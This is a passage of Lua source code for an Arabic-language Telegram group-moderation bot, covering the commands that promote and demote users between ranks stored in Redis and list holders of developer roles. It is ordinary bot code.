redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif Constructor(msg) then
if TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif Owner(msg) then
if TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif Administrator(msg) then
if TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif Vips(msg) then
return false
else
return false
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,"*↯︙ تم ترقيته "..TextMsg.."*").helo,"md",true)  
return false
end
end
if text and text:match('^رفع (.*) @(%S+)$') and tonumber(msg.reply_to_message_id) == 0 then
local Usertext = {text:match('^رفع (.*) @(%S+)$')}
local TextMsg = Usertext[1]
local UserName = Usertext[2]
if msg.content.text then 
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر ليس لحساب شخصي تأكد منه*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر لقناه او المجموعه تأكد منه*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*• عذرا يجب ان تستخدم معرف لحساب شخصي فقط*","md",true)  
return false
end
if TextMsg == 'مطور ثانوي' then
srt = "programmer"
srt1 = ":"
elseif TextMsg == 'مطور' then
srt = "developer"
srt1 = ":"
elseif TextMsg == 'مالك' then
srt = "Creator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ اساسي' then
srt = "BasicConstructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ' then
srt = "Constructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مدير' then
srt = "Owner"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'ادمن' then
srt = "Administrator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مميز' then
srt = "Vips"
srt1 = ":"..msg.chat_id..":"
else
return false
end  
local UserInfo = bot.getUser(UserId_Info.id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً تستطيع فقط استخدام الامر على المستخدمين*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً لا تستطيع استخدام الامر على البوت*","md",true)  
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:up") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• الرفع معطل من قبل المنشئين الاساسيين*").yu,"md",true)  
return false
end
end
if redis:sismember(bot_id..srt1.."Status:"..srt,UserId_Info.id) then
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,"* ↯︙تم ترقيته "..TextMsg.." من قبل*").helo,"md",true)  
return false
end
if devB(msg.sender.user_id) then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif programmer(msg) then
if TextMsg == 'مطور' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مالك' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end
elseif developer(msg) then
if TextMsg == 'مالك' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif Creator(msg) then
if TextMsg == 'مالك' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif BasicConstructor(msg) then
if TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif Constructor(msg) then
if TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif Owner(msg) then
if TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif Administrator(msg) then
if TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif Vips(msg) then
return false
else
return false
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,"*↯︙ تم ترقيته "..TextMsg.."*").helo,"md",true)  
return false
end
end
if text and text:match("^رفع (.*)$") and tonumber(msg.reply_to_message_id) ~= 0 then
local TextMsg = text:match("^رفع (.*)$")
if msg.content.text then 
if TextMsg == 'مطور ثانوي' then
srt = "programmer"
srt1 = ":"
elseif TextMsg == 'مطور' then
srt = "developer"
srt1 = ":"
elseif TextMsg == 'مالك' then
srt = "Creator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ اساسي' then
srt = "BasicConstructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ' then
srt = "Constructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مدير' then
srt = "Owner"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'ادمن' then
srt = "Administrator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مميز' then
srt = "Vips"
srt1 = ":"..msg.chat_id..":"
else
return false
end  
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:up") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• الرفع معطل من قبل المنشئين الاساسيين .*").yu,"md",true)  
return false
end
end
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً تستطيع فقط استخدام الامر على المستخدمين*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً لا تستطيع استخدام الامر على البوت*","md",true)  
return false
end
if redis:sismember(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id) then
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,"* ↯︙تم ترقيته "..TextMsg.." من قبل*").helo,"md",true)  
return false
end 
if devB(msg.sender.user_id) then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif programmer(msg) then
if TextMsg == 'مطور' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مالك' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end
elseif developer(msg) then
if TextMsg == 'مالك' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif Creator(msg) then
if TextMsg == 'مالك' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif BasicConstructor(msg) then
if TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif Constructor(msg) then
if TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif Owner(msg) then
if TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif Administrator(msg) then
if TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif Vips(msg) then
return false
else
return false
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,"*↯︙ تم ترقيته "..TextMsg.."*").helo,"md",true)  
return false
end
end 
if text and text:match('^تنزيل (.*) (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local Usertext = {text:match('^تنزيل (.*) (%d+)$')}
local TextMsg = Usertext[1]
local UserName = Usertext[2]
if msg.content.text then 
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if TextMsg == 'مطور ثانوي' then
srt = "programmer"
srt1 = ":"
elseif TextMsg == 'مطور' then
srt = "developer"
srt1 = ":"
elseif TextMsg == 'مالك' then
srt = "Creator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ اساسي' then
srt = "BasicConstructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ' then
srt = "Constructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مدير' then
srt = "Owner"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'ادمن' then
srt = "Administrator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مميز' then
srt = "Vips"
srt1 = ":"..msg.chat_id..":"
else
return false
end  
if not redis:sismember(bot_id..srt1.."Status:"..srt,UserName) then
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,"*↯︙لم يتم رفعه  "..TextMsg.." من قبل*").helo,"md",true)  
return false
end
if devB(msg.sender.user_id) then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif programmer(msg) then
if TextMsg == 'مطور' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مالك' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end
elseif developer(msg) then
if TextMsg == 'مالك' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif Creator(msg) then
if TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif BasicConstructor(msg) then
if TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif Constructor(msg) then
if TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif Owner(msg) then
if TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif Administrator(msg) then
if TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif Vips(msg) then
return false
else
return false
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(usetid,"*↯︙تم تنزيله من الرتبه التاليه  "..TextMsg.." *").helo,"md",true)  
return false
end
end
if text and text:match('^تنزيل (.*) @(%S+)$') and tonumber(msg.reply_to_message_id) == 0 then
local Usertext = {text:match('^تنزيل (.*) @(%S+)$')}
local TextMsg = Usertext[1]
local UserName = Usertext[2]
if msg.content.text then 
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر ليس لحساب شخصي تأكد منه*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر لقناه او المجموعه تأكد منه*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*• عذرا يجب ان تستخدم معرف لحساب شخصي فقط*","md",true)  
return false
end
if TextMsg == 'مطور ثانوي' then
srt = "programmer"
srt1 = ":"
elseif TextMsg == 'مطور' then
srt = "developer"
srt1 = ":"
elseif TextMsg == 'مالك' then
srt = "Creator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ اساسي' then
srt = "BasicConstructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ' then
srt = "Constructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مدير' then
srt = "Owner"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'ادمن' then
srt = "Administrator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مميز' then
srt = "Vips"
srt1 = ":"..msg.chat_id..":"
else
return false
end  
local UserInfo = bot.getUser(UserId_Info.id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً تستطيع فقط استخدام الامر على المستخدمين*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً لا تستطيع استخدام الامر على البوت*","md",true)  
return false
end
if not redis:sismember(bot_id..srt1.."Status:"..srt,UserId_Info.id) then
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,"*↯︙لم يتم رفعه  "..TextMsg.." من قبل*").helo,"md",true)  
return false
end
if devB(msg.sender.user_id) then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif programmer(msg) then
if TextMsg == 'مطور' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مالك' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end
elseif developer(msg) then
if TextMsg == 'مالك' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif Creator(msg) then
if TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif BasicConstructor(msg) then
if TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif Constructor(msg) then
if TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif Owner(msg) then
if TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif Administrator(msg) then
if TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif Vips(msg) then
return false
else
return false
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,"*↯︙تم تنزيله من الرتبه التاليه  "..TextMsg.." *").helo,"md",true)  
return false
end
end
if text and text:match("^تنزيل (.*)$") and tonumber(msg.reply_to_message_id) ~= 0 then
local TextMsg = text:match("^تنزيل (.*)$")
if msg.content.text then 
if TextMsg == 'مطور ثانوي' then
srt = "programmer"
srt1 = ":"
elseif TextMsg == 'مطور' then
srt = "developer"
srt1 = ":"
elseif TextMsg == 'مالك' then
srt = "Creator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ اساسي' then
srt = "BasicConstructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ' then
srt = "Constructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مدير' then
srt = "Owner"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'ادمن' then
srt = "Administrator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مميز' then
srt = "Vips"
srt1 = ":"..msg.chat_id..":"
else
return false
end  
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً تستطيع فقط استخدام الامر على المستخدمين*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً لا تستطيع استخدام الامر على البوت*","md",true)  
return false
end
if not redis:sismember(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id) then
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,"*↯︙لم يتم رفعه  "..TextMsg.." من قبل*").helo,"md",true)  
return false
end
if devB(msg.sender.user_id) then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif programmer(msg) then
if TextMsg == 'مطور' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مالك' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end
elseif developer(msg) then
if TextMsg == 'مالك' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif Creator(msg) then
if TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif BasicConstructor(msg) then
if TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif Constructor(msg) then
if TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif Owner(msg) then
if TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif Administrator(msg) then
if TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif Vips(msg) then
return false
else
return false
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,"*↯︙تم تنزيله من الرتبه التاليه  "..TextMsg.." *").helo,"md",true)  
return false
end
end
----------------------------------------------------------------------------------------------------
if Administrator(msg) then
if text == 'الثانويين' or text == 'الثانوين' or text == 'المطورين الثانويين' then
t = '\n*• قائمه '..text..'  \n ━━━━━━━━━━━ *\n'
local Info_ = redis:smembers(bot_id..":Status:programmer") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• لا يوجد "..text:gsub('ال',"").."*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." • *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'المطورين' then
t = '\n*• قائمه '..text..'  \n ━━━━━━━━━━━ *\n'
local Info_ = redis:smembers(bot_id..":Status:developer") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• لا يوجد "..text:gsub('ال',"").."*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." • *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'المالكين' then
t = '\n*• قائمه '..text..'  \n ━━━━━━━━━━━ *\n'
